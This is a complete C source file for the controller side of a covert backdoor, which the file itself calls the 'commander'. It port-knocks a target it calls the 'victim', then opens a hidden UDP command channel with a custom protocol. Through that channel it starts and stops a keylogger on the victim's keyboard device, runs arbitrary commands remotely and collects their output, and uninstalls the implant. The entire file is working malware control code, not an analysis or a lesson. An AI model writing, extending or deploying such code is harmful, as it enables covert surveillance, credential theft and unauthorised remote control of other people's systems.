#include <arpa/inet.h>
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define KNOCK_PORT_COUNT 3
#define KNOCK_PORT_BASE 5001
#define COVERT_PORT 7777
#define PACKET_SIZE_MAX 1400
#define MENU_BUFFER_SIZE 1024
#define KEYLOGGER_DEVICE_MAX 256
#define DEFAULT_KNOCK_DELAY_MS 150
#define DEFAULT_KEYLOGGER_DEVICE "/dev/input/event0"
#define RESPONSE_TIMEOUT_MS 5000
#define EXEC_RESPONSE_TIMEOUT_MS 30000
#define MENU_INVALID -1
#define MENU_EOF     -2

#define CMD_DISCONNECT 0x01
#define CMD_HEARTBEAT  0x02
#define CMD_KEYLOG_START 0x10
#define CMD_KEYLOG_STOP  0x11
#define CMD_EXEC_CMD      0x30
#define CMD_EXEC_OUTPUT   0x31
#define CMD_UNINSTALL    0xFE

#define CMD_OK    0xF0
#define CMD_ERROR 0xF1
#define CMD_ACK   0xF2

#define SEQ_INIT 0x13370000

typedef struct __attribute__((packed)) {
    uint32_t seq_num;
    uint8_t command;
    uint16_t payload_len;
} covert_header_t;

typedef struct {
    int sock;
    struct sockaddr_in peer_addr;
    uint32_t next_seq;
    uint32_t expected_response_seq;
    int connected;
    char peer_ip[INET_ADDRSTRLEN];
} session_t;

typedef struct {
    uint32_t seq_num;
    uint8_t command;
    uint16_t payload_len;
    const uint8_t *payload;
} parsed_packet_t;

typedef struct {
    char victim_ip[INET_ADDRSTRLEN];
    int auto_connect;
} commander_config_t;

static void usage(const char *prog);
static int parse_args(int argc, char **argv, commander_config_t *cfg);
static int read_line(const char *prompt, char *buf, size_t buf_len);
static int read_menu_choice(void);
static int is_valid_ipv4(const char *ip);
static int set_victim_ip(commander_config_t *cfg);
static int port_knock(const char *victim_ip);
static int send_udp_byte(int sock, const char *victim_ip, uint16_t port, uint8_t value);
static void sleep_ms(long milliseconds);
static int session_open(session_t *session, const char *victim_ip);
static void session_close(session_t *session);
static int session_send_command(session_t *session, uint8_t command, const uint8_t *payload, uint16_t payload_len);
static int session_receive_packet(session_t *session, parsed_packet_t *parsed, uint8_t *packet, size_t packet_size, int timeout_ms);
static int session_receive_single_response(session_t *session);
static int session_receive_exec_response(session_t *session);
static int parse_packet(const uint8_t *packet, size_t packet_len, parsed_packet_t *parsed, char *error, size_t error_len);
static void print_status_response(const parsed_packet_t *packet);
static void print_payload_text(const uint8_t *payload, uint16_t payload_len, int trim_nul);
static int read_keylogger_device(char *device_path, size_t device_path_len);
static int start_keylogger(session_t *session);
static int stop_keylogger(session_t *session);
static int run_victim_command(session_t *session);
static int uninstall_victim(session_t *session, int *exit_requested);
static uint16_t compute_checksum(const uint8_t *data, size_t len);
static const char *command_name(uint8_t command);
static void print_disconnected_menu(const commander_config_t *cfg);
static void print_connected_menu(const session_t *session);
static void disconnected_loop(commander_config_t *cfg, session_t *session, int *exit_requested);
static void connected_loop(session_t *session, int *exit_requested);

int main(int argc, char **argv) {
    commander_config_t cfg;
    session_t session;
    int exit_requested = 0;

    memset(&cfg, 0, sizeof(cfg));
    memset(&session, 0, sizeof(session));
    session.sock = -1;
    snprintf(cfg.victim_ip, sizeof(cfg.victim_ip), "%s", "127.0.0.1");

    if (parse_args(argc, argv, &cfg) != 0) {
        usage(argv[0]);
        return EXIT_FAILURE;
    }

    printf("Commander started\n");

    if (cfg.auto_connect) {
        printf("Connecting to %s...\n", cfg.victim_ip);
        if (port_knock(cfg.victim_ip) == 0 && session_open(&session, cfg.victim_ip) == 0) {
            printf("Session active with %s\n", session.peer_ip);
        } else {
            fprintf(stderr, "Connection failed\n");
        }
    }

    while (!exit_requested) {
        if (session.connected) {
            connected_loop(&session, &exit_requested);
        } else {
            disconnected_loop(&cfg, &session, &exit_requested);
        }
    }

    session_close(&session);
    printf("Commander exiting\n");
    return EXIT_SUCCESS;
}

static void usage(const char *prog) {
    fprintf(stderr, "Usage: %s [victim_ip] [--connect]\n", prog);
    fprintf(stderr, "  victim_ip   IPv4 address of the victim. Defaults to 127.0.0.1.\n");
    fprintf(stderr, "  --connect   Port-knock and open the session before showing the menu.\n");
}

static int parse_args(int argc, char **argv, commander_config_t *cfg) {
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            return -1;
        }

        if (strcmp(argv[i], "--connect") == 0 || strcmp(argv[i], "-c") == 0) {
            cfg->auto_connect = 1;
            continue;
        }

        if (!is_valid_ipv4(argv[i])) {
            fprintf(stderr, "Invalid IPv4 address or option: %s\n", argv[i]);
            return -1;
        }

        snprintf(cfg->victim_ip, sizeof(cfg->victim_ip), "%s", argv[i]);
    }

    return 0;
}

static int read_line(const char *prompt, char *buf, size_t buf_len) {
    size_t len;

    if (prompt != NULL) {
        printf("%s", prompt);
        fflush(stdout);
    }

    if (fgets(buf, (int)buf_len, stdin) == NULL) {
        return -1;
    }

    len = strlen(buf);
    if (len > 0 && buf[len - 1] == '\n') {
        buf[len - 1] = '\0';
    }

    return 0;
}

static int read_menu_choice(void) {
    char buf[MENU_BUFFER_SIZE];
    char *end = NULL;
    long choice;

    if (read_line("> ", buf, sizeof(buf)) != 0) {
        return MENU_EOF;
    }

    errno = 0;
    choice = strtol(buf, &end, 10);
    if (errno != 0 || end == buf || *end != '\0') {
        return MENU_INVALID;
    }

    return (int)choice;
}

static int is_valid_ipv4(const char *ip) {
    struct sockaddr_in addr;
    return ip != NULL && inet_pton(AF_INET, ip, &addr.sin_addr) == 1;
}

static int set_victim_ip(commander_config_t *cfg) {
    char ip[MENU_BUFFER_SIZE];

    if (read_line("Victim IPv4 address: ", ip, sizeof(ip)) != 0) {
        return -1;
    }

    if (!is_valid_ipv4(ip)) {
        fprintf(stderr, "Invalid IPv4 address\n");
        return -1;
    }

    snprintf(cfg->victim_ip, sizeof(cfg->victim_ip), "%s", ip);
    return 0;
}

static int port_knock(const char *victim_ip) {
    int sock;
    int result = 0;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    printf("Port-knocking %s on UDP ports", victim_ip);
    for (uint16_t i = 0; i < KNOCK_PORT_COUNT; i++) {
        uint16_t port = (uint16_t)(KNOCK_PORT_BASE + i);
        printf(" %u", (unsigned)port);
        fflush(stdout);

        if (send_udp_byte(sock, victim_ip, port, (uint8_t)i) != 0) {
            result = -1;
            break;
        }

        sleep_ms(DEFAULT_KNOCK_DELAY_MS);
    }

    printf("\n");
    close(sock);
    return result;
}

static int send_udp_byte(int sock, const char *victim_ip, uint16_t port, uint8_t value) {
    struct sockaddr_in addr;
    ssize_t sent;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, victim_ip, &addr.sin_addr) != 1) {
        fprintf(stderr, "Invalid victim IPv4 address: %s\n", victim_ip);
        return -1;
    }

    sent = sendto(sock, &value, sizeof(value), 0, (struct sockaddr *)&addr, sizeof(addr));
    if (sent != (ssize_t)sizeof(value)) {
        perror("sendto");
        return -1;
    }

    return 0;
}

static void sleep_ms(long milliseconds) {
    struct timespec req;

    req.tv_sec = milliseconds / 1000;
    req.tv_nsec = (milliseconds % 1000) * 1000000L;

    while (nanosleep(&req, &req) == -1 && errno == EINTR) {
    }
}

static int session_open(session_t *session, const char *victim_ip) {
    int sock;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    memset(session, 0, sizeof(*session));
    session->sock = sock;
    session->peer_addr.sin_family = AF_INET;
    session->peer_addr.sin_port = htons(COVERT_PORT);
    session->next_seq = SEQ_INIT;
    session->expected_response_seq = SEQ_INIT;

    if (inet_pton(AF_INET, victim_ip, &session->peer_addr.sin_addr) != 1) {
        fprintf(stderr, "Invalid victim IPv4 address: %s\n", victim_ip);
        session_close(session);
        return -1;
    }

    snprintf(session->peer_ip, sizeof(session->peer_ip), "%s", victim_ip);
    session->connected = 1;

    if (session_send_command(session, CMD_HEARTBEAT, NULL, 0) != 0) {
        session_close(session);
        return -1;
    }

    return 0;
}

static void session_close(session_t *session) {
    if (session->sock >= 0) {
        close(session->sock);
    }

    memset(session, 0, sizeof(*session));
    session->sock = -1;
}

static int session_send_command(session_t *session, uint8_t command, const uint8_t *payload, uint16_t payload_len) {
    uint8_t packet[PACKET_SIZE_MAX];
    covert_header_t header;
    uint16_t checksum;
    size_t packet_len;
    ssize_t sent;

    if (!session->connected || session->sock < 0) {
        fprintf(stderr, "No active session\n");
        return -1;
    }

    if (payload_len > PACKET_SIZE_MAX - sizeof(header) - sizeof(checksum)) {
        fprintf(stderr, "Payload too large\n");
        return -1;
    }

    header.seq_num = htonl(session->next_seq++);
    header.command = command;
    header.payload_len = htons(payload_len);

    memcpy(packet, &header, sizeof(header));

    if (payload_len > 0 && payload != NULL) {
        memcpy(packet + sizeof(header), payload, payload_len);
    }

    packet_len = sizeof(header) + payload_len;
    checksum = htons(compute_checksum(packet, packet_len));
    memcpy(packet + packet_len, &checksum, sizeof(checksum));
    packet_len += sizeof(checksum);

    sent = sendto(
        session->sock,
        packet,
        packet_len,
        0,
        (struct sockaddr *)&session->peer_addr,
        sizeof(session->peer_addr)
    );

    if (sent != (ssize_t)packet_len) {
        perror("sendto");
        return -1;
    }

    if (command == CMD_EXEC_CMD) {
        return session_receive_exec_response(session);
    }

    return session_receive_single_response(session);
}

static int session_receive_packet(session_t *session, parsed_packet_t *parsed, uint8_t *packet, size_t packet_size, int timeout_ms) {
    struct sockaddr_in src_addr;
    socklen_t src_len = sizeof(src_addr);
    fd_set read_fds;
    struct timeval timeout;
    ssize_t received;
    char error[128];

    while (1) {
        int ready;

        FD_ZERO(&read_fds);
        FD_SET(session->sock, &read_fds);
        timeout.tv_sec = timeout_ms / 1000;
        timeout.tv_usec = (timeout_ms % 1000) * 1000;

        ready = select(session->sock + 1, &read_fds, NULL, NULL, &timeout);
        if (ready < 0) {
            if (errno == EINTR) {
                continue;
            }
            perror("select response");
            return -1;
        }

        if (ready == 0) {
            fprintf(stderr, "Timed out waiting for victim response\n");
            return -1;
        }

        received = recvfrom(
            session->sock,
            packet,
            packet_size,
            0,
            (struct sockaddr *)&src_addr,
            &src_len
        );

        if (received < 0) {
            if (errno == EINTR) {
                continue;
            }
            perror("recvfrom response");
            return -1;
        }

        if (src_addr.sin_addr.s_addr != session->peer_addr.sin_addr.s_addr ||
            src_addr.sin_port != htons(COVERT_PORT)) {
            char src_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &src_addr.sin_addr, src_ip, sizeof(src_ip));
            printf("Ignoring response from unexpected peer %s:%u\n",
                   src_ip,
                   (unsigned)ntohs(src_addr.sin_port));
            continue;
        }

        if (parse_packet(packet, (size_t)received, parsed, error, sizeof(error)) != 0) {
            fprintf(stderr, "Invalid victim response: %s\n", error);
            return -1;
        }

        if (parsed->seq_num != session->expected_response_seq) {
            printf("Response sequence notice: received 0x%08x, expected 0x%08x\n",
                   parsed->seq_num,
                   session->expected_response_seq);
        }

        if (parsed->seq_num >= session->expected_response_seq) {
            session->expected_response_seq = parsed->seq_num + 1;
        }

        return 0;
    }
}

static int session_receive_single_response(session_t *session) {
    uint8_t packet[PACKET_SIZE_MAX];
    parsed_packet_t parsed;

    if (session_receive_packet(session, &parsed, packet, sizeof(packet), RESPONSE_TIMEOUT_MS) != 0) {
        return -1;
    }

    print_status_response(&parsed);
    return parsed.command == CMD_ERROR ? -1 : 0;
}

static int session_receive_exec_response(session_t *session) {
    uint8_t packet[PACKET_SIZE_MAX];
    parsed_packet_t parsed;
    int saw_output = 0;
    int output_ended_with_newline = 1;

    while (1) {
        if (session_receive_packet(session, &parsed, packet, sizeof(packet), EXEC_RESPONSE_TIMEOUT_MS) != 0) {
            return -1;
        }

        if (parsed.command == CMD_EXEC_OUTPUT) {
            if (!saw_output) {
                printf("Victim output:\n");
                saw_output = 1;
            }

            if (parsed.payload_len > 0) {
                fwrite(parsed.payload, 1, parsed.payload_len, stdout);
                output_ended_with_newline = parsed.payload[parsed.payload_len - 1] == '\n';
            }
            fflush(stdout);
            continue;
        }

        if (saw_output && !output_ended_with_newline) {
            printf("\n");
        }

        print_status_response(&parsed);
        return parsed.command == CMD_ERROR ? -1 : 0;
    }
}

static int parse_packet(const uint8_t *packet, size_t packet_len, parsed_packet_t *parsed, char *error, size_t error_len) {
    covert_header_t header;
    uint16_t payload_len;
    uint16_t received_checksum;
    uint16_t computed_checksum;
    size_t expected_len;

    if (packet_len < sizeof(covert_header_t) + sizeof(received_checksum)) {
        snprintf(error, error_len, "packet too short");
        return -1;
    }

    memcpy(&header, packet, sizeof(header));
    payload_len = ntohs(header.payload_len);

    if (payload_len > PACKET_SIZE_MAX - sizeof(covert_header_t) - sizeof(received_checksum)) {
        snprintf(error, error_len, "payload too large");
        return -1;
    }

    expected_len = sizeof(covert_header_t) + payload_len + sizeof(received_checksum);
    if (packet_len != expected_len) {
        snprintf(error, error_len, "packet length mismatch");
        return -1;
    }

    memcpy(&received_checksum, packet + sizeof(covert_header_t) + payload_len, sizeof(received_checksum));
    received_checksum = ntohs(received_checksum);
    computed_checksum = compute_checksum(packet, sizeof(covert_header_t) + payload_len);

    if (received_checksum != computed_checksum) {
        snprintf(error, error_len, "checksum mismatch");
        return -1;
    }

    parsed->seq_num = ntohl(header.seq_num);
    parsed->command = header.command;
    parsed->payload_len = payload_len;
    parsed->payload = packet + sizeof(covert_header_t);

    return 0;
}

static void print_status_response(const parsed_packet_t *packet) {
    printf("Victim %s: ", command_name(packet->command));
    print_payload_text(packet->payload, packet->payload_len, 1);
}

static void print_payload_text(const uint8_t *payload, uint16_t payload_len, int trim_nul) {
    size_t len = payload_len;

    if (trim_nul && len > 0 && payload[len - 1] == '\0') {
        len--;
    }

    if (len > 0 && payload != NULL) {
        fwrite(payload, 1, len, stdout);
        if (payload[len - 1] != '\n') {
            printf("\n");
        }
    } else {
        printf("(empty response)\n");
    }
}

static int read_keylogger_device(char *device_path, size_t device_path_len) {
    char input[MENU_BUFFER_SIZE];
    const char *selected_path;

    printf("Keyboard device path [%s]: ", DEFAULT_KEYLOGGER_DEVICE);
    fflush(stdout);

    if (read_line(NULL, input, sizeof(input)) != 0) {
        return -1;
    }

    selected_path = input[0] == '\0' ? DEFAULT_KEYLOGGER_DEVICE : input;

    if (strlen(selected_path) >= device_path_len) {
        fprintf(stderr, "Keyboard device path is too long\n");
        return -1;
    }

    snprintf(device_path, device_path_len, "%s", selected_path);
    return 0;
}

static int start_keylogger(session_t *session) {
    char device_path[KEYLOGGER_DEVICE_MAX];
    uint16_t payload_len;

    if (read_keylogger_device(device_path, sizeof(device_path)) != 0) {
        fprintf(stderr, "Keylogger start cancelled\n");
        return -1;
    }

    payload_len = (uint16_t)(strlen(device_path) + 1);
    if (session_send_command(session, CMD_KEYLOG_START, (const uint8_t *)device_path, payload_len) != 0) {
        return -1;
    }

    return 0;
}

static int stop_keylogger(session_t *session) {
    if (session_send_command(session, CMD_KEYLOG_STOP, NULL, 0) != 0) {
        return -1;
    }

    return 0;
}

static int run_victim_command(session_t *session) {
    char command[MENU_BUFFER_SIZE];
    uint16_t payload_len;

    if (read_line("Program/command to run on victim: ", command, sizeof(command)) != 0) {
        return -1;
    }

    if (command[0] == '\0') {
        fprintf(stderr, "Command cancelled\n");
        return -1;
    }

    payload_len = (uint16_t)(strlen(command) + 1);
    if (session_send_command(session, CMD_EXEC_CMD, (const uint8_t *)command, payload_len) != 0) {
        return -1;
    }

    return 0;
}

static int uninstall_victim(session_t *session, int *exit_requested) {
    if (session_send_command(session, CMD_UNINSTALL, NULL, 0) != 0) {
        return -1;
    }

    printf("Uninstall acknowledged; closing commander session\n");
    session_close(session);
    *exit_requested = 1;
    return 0;
}

static uint16_t compute_checksum(const uint8_t *data, size_t len) {
    uint32_t sum = 0;

    for (size_t i = 0; i < len; i++) {
        sum += data[i];
        if (sum >> 16) {
            sum = (sum & 0xFFFFu) + (sum >> 16);
        }
    }

    return (uint16_t)(~sum & 0xFFFFu);
}

static const char *command_name(uint8_t command) {
    switch (command) {
        case CMD_DISCONNECT:
            return "DISCONNECT";
        case CMD_HEARTBEAT:
            return "HEARTBEAT";
        case CMD_KEYLOG_START:
            return "KEYLOG_START";
        case CMD_KEYLOG_STOP:
            return "KEYLOG_STOP";
        case CMD_EXEC_CMD:
            return "EXEC_CMD";
        case CMD_EXEC_OUTPUT:
            return "EXEC_OUTPUT";
        case CMD_UNINSTALL:
            return "UNINSTALL";
        case CMD_OK:
            return "OK";
        case CMD_ERROR:
            return "ERROR";
        case CMD_ACK:
            return "ACK";
        default:
            return "UNKNOWN";
    }
}

static void print_disconnected_menu(const commander_config_t *cfg) {
    printf("\nCommander Menu\n");
    printf("Victim: %s\n", cfg->victim_ip);
    printf("1. Connect to victim\n");
    printf("2. Set victim IP\n");
    printf("3. Exit\n");
}

static void print_connected_menu(const session_t *session) {
    printf("\nCommander Session\n");
    printf("Connected to %s:%u\n", session->peer_ip, (unsigned)COVERT_PORT);
    printf("1. Start keylogger\n");
    printf("2. Stop keylogger\n");
    printf("3. Run program on victim\n");
    printf("4. Send heartbeat\n");
    printf("5. Disconnect\n");
    printf("6. Uninstall victim\n");
    printf("7. Exit\n");
}

static void disconnected_loop(commander_config_t *cfg, session_t *session, int *exit_requested) {
    int choice;

    print_disconnected_menu(cfg);
    choice = read_menu_choice();

    if (choice == MENU_EOF) {
        *exit_requested = 1;
        return;
    }

    switch (choice) {
        case 1:
            printf("Connecting to %s...\n", cfg->victim_ip);
            if (port_knock(cfg->victim_ip) == 0 && session_open(session, cfg->victim_ip) == 0) {
                printf("Session active with %s\n", session->peer_ip);
            } else {
                fprintf(stderr, "Connection failed\n");
                session_close(session);
            }
            break;
        case 2:
            (void)set_victim_ip(cfg);
            break;
        case 3:
            *exit_requested = 1;
            break;
        default:
            fprintf(stderr, "Invalid menu choice\n");
            break;
    }
}

static void connected_loop(session_t *session, int *exit_requested) {
    int choice;

    print_connected_menu(session);
    choice = read_menu_choice();

    if (choice == MENU_EOF) {
        (void)session_send_command(session, CMD_DISCONNECT, NULL, 0);
        printf("Input closed; disconnecting\n");
        session_close(session);
        *exit_requested = 1;
        return;
    }

    switch (choice) {
        case 1:
            (void)start_keylogger(session);
            break;
        case 2:
            (void)stop_keylogger(session);
            break;
        case 3:
            (void)run_victim_command(session);
            break;
        case 4:
            (void)session_send_command(session, CMD_HEARTBEAT, NULL, 0);
            break;
        case 5:
            (void)session_send_command(session, CMD_DISCONNECT, NULL, 0);
            session_close(session);
            break;
        case 6:
            (void)uninstall_victim(session, exit_requested);
            break;
        case 7:
            printf("Disconnect before exiting so the session ends cleanly.\n");
            *exit_requested = 0;
            break;
        default:
            fprintf(stderr, "Invalid menu choice\n");
            break;
    }
}
